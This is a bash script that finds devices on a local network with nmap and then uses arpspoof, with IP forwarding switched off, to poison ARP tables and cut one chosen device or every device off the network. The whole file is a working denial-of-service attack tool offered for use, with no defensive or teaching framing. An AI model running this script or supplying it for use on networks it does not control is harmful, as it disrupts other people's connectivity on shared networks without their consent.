#!/bin/bash

usage()
{
    echo "Usage: $0 [-all][-list][-i] xxx.xxx.xxx.xxx"
}

help()
{
    usage
    echo "  -list: list devices on the network (nmap)"
    echo "  -all: block all devices on the network (arpspoof)"
    echo "  xxx.xxx.xxx.xxx: block the provided ip (arpspoof)"
    echo "  -help: show this help"
    echo "  -i: choose interface (wlan0,eth0 etc)"
}

#List hosts on your network. Using sudo we can access to the mac address and the nic vendor.
list_hosts()
{
    echo "Looking up hosts on your network, this could take a while..."
    nmap -sP $IP-254 -e $INTERFACE #Hopefully the gateway is on x.x.x.1
    echo "Done."
    
}
#Kills the ip in the argument, all if there is no argument.
kill()
{
    target=""
    if [[ "$1" != "-all" ]]; then
        if [[ "$1" =~ [0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3} ]]; then
            echo "Gonna kill $1."
            target="-t $1"
        else
            echo "Wrong ip format. $var"
            exit 1
        fi
    else
        echo "Gonna kill em all."
    fi
    
    echo -n 0 > /proc/sys/net/ipv4/ip_forward
    
    arpspoof -i eth0 $IP $target
    if [[ $? -eq 1 ]]; then
        echo "Try to edit arpspoof command with your current network interface."
    fi
    
    echo -n $oldipforward > /proc/sys/net/ipv4/ip_forward

}

#First of all, check if the required programs are installed:
type arpspoof >/dev/null 2>&1 || { echo -e >&2 "Arpspoof is required but is not installed.\nRun 'sudo apt-get install dsniff' Aborting."; exit 1; }
type nmap >/dev/null 2>&1 || { echo -e >&2 "Nmap is required but is not installed.\nRun 'sudo apt-get install nmap' Aborting."; exit 1; }

INTERFACE=wlan0 #default interface

IP=`route -n|grep ^0.0.0.0|cut -d' ' -f 10`

if [ "$(id -u)" != "0" ]; then
   echo "Sorry, you must run this script as root." 1>&2
   exit 1
fi

if [ $# -eq 0 ]; then
    echo "Too few arguments: $#"
    usage
    exit 0
fi

if [[ "$1" == "-help" ]]; then
    help
    exit 0
fi



if [[ "$1" == "-list" ]]; then
    if [[ "$2" == "-i" ]]; then
        INTERFACE=$3
        list_hosts
        exit 0
    fi
    list_hosts
    exit 0
fi

if [[ "$2" == "-i" ]]; then
        INTERFACE=$3
fi
#Good guy saves old setting of ip forwarding
oldipforward=`cat /proc/sys/net/ipv4/ip_forward`

kill $1
